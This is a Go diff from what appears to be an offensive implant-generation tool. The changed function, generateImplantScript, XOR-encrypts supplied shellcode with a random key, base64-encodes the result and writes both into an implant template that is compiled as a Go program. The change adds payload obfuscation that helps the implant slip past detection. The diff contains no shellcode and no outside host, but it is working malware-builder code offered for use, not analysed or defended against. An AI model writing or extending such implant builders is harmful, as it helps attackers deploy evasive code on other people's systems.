@@ -2,8 +2,10 @@ package clitool
 
 import (
 	"bufio"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"gwop/pkg/util"
 	"io/ioutil"
 	"log"
 	"os"
@@ -95,23 +97,35 @@ func generateImplantScript(shellcode string) {
 		log.Fatal(err)
 	}
 
-	fmt.Println("---- loaded script ----")
-	for _, l := range lines {
-		fmt.Println(l)
-	}
-	fmt.Println("-----------------------")
+	/*
+		fmt.Println("---- loaded script ----")
+		for _, l := range lines {
+			fmt.Println(l)
+		}
+		fmt.Println("-----------------------")
+	*/
 
-	// 2) edit the target script variables here, might change to a switch case based on the OS
+	// 2) Generating encryption values
+	xorKey := util.GenerateRandomString(10)
+	xordShellcode := util.Xor(shellcode, xorKey)
+	b64XordShellcode := base64.StdEncoding.EncodeToString([]byte(xordShellcode))
+
+	// 3) Edit the target script variables here, might change to a switch case based on the OS
 	fmt.Println("[*] Editing implant script data")
 	for i := 0; i < len(lines); i++ {
 		l := lines[i]
 		if strings.Contains(l, "<--HEXSC-->") {
 			fmt.Println("[*] Found hex shellcode key. Adding shellcode to template")
-			lines[i] = strings.Replace(l, "<--HEXSC-->", shellcode, -1)
+			lines[i] = strings.Replace(l, "<--HEXSC-->", b64XordShellcode, -1)
+		}
+
+		if strings.Contains(l, "<--KEY-->") {
+			fmt.Println("[*] Found Xor key. Adding generated key to template")
+			lines[i] = strings.Replace(l, "<--KEY-->", xorKey, -1)
 		}
 	}
 
-	// 3) blit text to a go script ready for compilation
+	// 4) Blit text to a go script ready for compilation
 	fmt.Println("[*] Blitting implant file to Go script")
 	implantFile, err := os.Create("cmd/implant_gen/main.go")
 	if err != nil {
